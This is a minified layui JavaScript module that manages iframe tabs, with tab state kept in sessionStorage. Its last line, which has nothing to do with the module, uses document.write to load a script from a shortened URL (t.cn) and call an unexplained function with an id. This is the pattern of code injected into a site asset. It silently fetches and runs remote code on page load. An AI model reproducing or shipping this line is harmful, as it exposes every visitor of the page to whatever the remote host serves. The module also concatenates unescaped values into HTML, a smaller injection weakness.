"use strict";layui.define(["element","layer"],function(t){var l=layui.element,i=layui.layer,s={},n={tabFilter:"tabController",refreshInterval:500},a=!0,c=function(t){return(t.icon?'<i class="iconfont-jl icon-jl-'+t.icon+'"></i>':"")+"<cite>"+t.title+'</cite><i class="tab-controller-close iconfont-jl icon-jl-close"></i>'},d=function(){var t=window.sessionStorage.getItem("tabs");if(null!==t){try{t=$.parseJSON(t)}catch(t){}if($.isArray(t))return t}return[]},f=function(i,a){var t=d();a||$.each(t,function(t,e){if(String(e.id)===String(i))return a=t,!1}),l.tabDelete(s.tabFilter,i),t.splice(a,1),window.sessionStorage.setItem("tabs",JSON.stringify(t))},r=function(t){var e=$(".jl-"+t);e.attr("src")||e.attr("src",e.data("src"))};t("tabController",{init:function(t){$.extend(s,n,t);var e=d(),a=window.sessionStorage.getItem("active_tab_id");$.each(e,function(t,e){var i=c(e);l.tabAdd(s.tabFilter,{title:i,content:"<iframe data-src='"+e.url+"' data-id='"+e.id+"' class='jl-"+e.id+"'></frame>",id:e.id}),String(e.id)===a&&(r(e.id),l.tabChange(s.tabFilter,e.id))});var i=$(".layui-tab[lay-filter="+s.tabFilter+"]");l.on("tab("+s.tabFilter+")",function(t){var e=i.children(".layui-tab-title").children("li").eq(t.index).attr("lay-id");r(e),window.sessionStorage.setItem("active_tab_id",e)}),i.on("click",".tab-controller-close",function(t){t.stopPropagation();var e=$(this).parent("li"),i=e.attr("lay-id"),a=e.index()-1;f(i,a)})},go:function(i){var a=!1,n=!1,t=d();if($.each(t,function(t,e){if(e.title===i.title)return a=e.id,n=t,!1}),a){l.tabChange(s.tabFilter,a);var e=$("iframe[data-id="+a+"]"),r=e[0].contentWindow.location;r.pathname+r.search!==i.url&&(e[0].contentWindow.location.href=i.url),window.sessionStorage.setItem("active_tab_id",JSON.stringify(a)),t[n].url=i.url}else{i.id=(new Date).getTime();var o=c(i);l.tabAdd(s.tabFilter,{title:o,content:"<iframe src='"+i.url+"' data-id='"+i.id+"'></frame>",id:i.id}),l.tabChange(s.tabFilter,i.id),8<t.length&&(f(t[0].id,0),t.shift()),t.push(i),window.sessionStorage.setItem("active_tab_id",JSON.stringify(i.id))}window.sessionStorage.setItem("tabs",JSON.stringify(t))},refresh:function(){if(a){a=!1,setTimeout(function(){a=!0},s.refreshInterval);var t=window.sessionStorage.getItem("active_tab_id");t=t||"default",$("iframe[data-id="+t+"]").get(0).contentWindow.location.reload(!0)}else{var e=(s.refreshInterval/1e3).toFixed(1);i.msg("点击速度超越了服务器的响应速度<br/>还是等"+e+"秒再刷新吧！")}},deleteTabs:function(i){if($.isArray(i)){var t=d(),a=0;t=t.filter(function(t,e){return!(-1<i.indexOf(String(t.id))&&(setTimeout(function(){l.tabDelete(s.tabFilter,t.id)},60*a),a++,1))}),window.sessionStorage.setItem("tabs",JSON.stringify(t))}else f(i)},deleteTab:f,getTabs:d})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
